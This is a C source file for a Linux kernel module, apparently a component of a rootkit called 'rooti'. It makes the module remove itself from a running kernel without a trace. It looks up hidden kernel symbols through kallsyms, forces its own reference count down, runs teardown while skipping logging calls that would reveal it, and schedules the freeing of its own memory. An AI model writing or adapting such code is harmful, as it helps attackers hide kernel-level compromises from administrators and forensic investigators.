#include <linux/workqueue.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/notifier.h>
#include <linux/async.h>
#include "unloading.h"
#include "../utils.h"

#define MODULE_REF_BASE 1

// Implemented in deallocate.S
extern void rooti_self_deallocate(struct work_struct *work);
DECLARE_WORK(rooti_self_deallocate_work, rooti_self_deallocate);

typedef void (*free_module_t)(struct module *);
free_module_t __free_module = NULL;
struct module *this_module_ptr = THIS_MODULE;

static int __try_release_module_ref(struct module *mod)
{
	int ret = atomic_sub_return(MODULE_REF_BASE, &mod->refcnt);
	BUG_ON(ret < 0);
	if (ret) {
		ret = atomic_add_unless(&mod->refcnt, MODULE_REF_BASE, 0);   
    }
	return ret;
}

/*
	This function is similar to sys_delete_module() but without access to userspace memory and
	without some logging calls that leave traces of this module. It performs all teardown operations
	immediately and schedules the deallocation of the modules memory to a background workqueue.
*/
static int rooti_schedule_self_unloading(void) {
	ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
	ROOTI_RESOLVE_SYM_ADDR(struct blocking_notifier_head *, module_notify_list, -ENOENT);

	mutex_lock(__module_mutex);

	// Check if by chance other modules depend on us (this should never happen in a non-debug build)
	if (!list_empty(&THIS_MODULE->source_list)) {
		ROOTI_DEBUG("other modules depend on this module, cannot unload safely");
		return -EWOULDBLOCK;
	}

	// Checking if the module is during initialization or already dying
	if (THIS_MODULE->state != MODULE_STATE_LIVE) {
		ROOTI_DEBUG("module is during initialization or already dying");
		return -EBUSY;
	}

	// TODO: maybe call try_stop_module itself ?
	__try_release_module_ref(THIS_MODULE);
	THIS_MODULE->state = MODULE_STATE_GOING;

	mutex_unlock(__module_mutex);
	blocking_notifier_call_chain(__module_notify_list, MODULE_STATE_GOING, THIS_MODULE);
	THIS_MODULE->exit();

	// TODO: klp_module_going(mod)
	// TODO: ftrace_release_mod(mod)

	async_synchronize_full();

	// Call to free the module's own memory, there's no coming back after
	// the scheduled work completes. This operation needs to be scheduled to the background
	// because the service routine needs to be completed before we can get rid of the module.
    queue_work(system_long_wq, &rooti_self_deallocate_work);

	return 0;
}

int rooti_schedule_self_deletion()
{
	__free_module = (free_module_t)__kallsyms_lookup_name("free_module");
	if (__free_module == NULL) {
		ROOTI_DEBUG("unresolved symbol 'free_module'");
		return -ENOENT;
	}
	return rooti_schedule_self_unloading();
}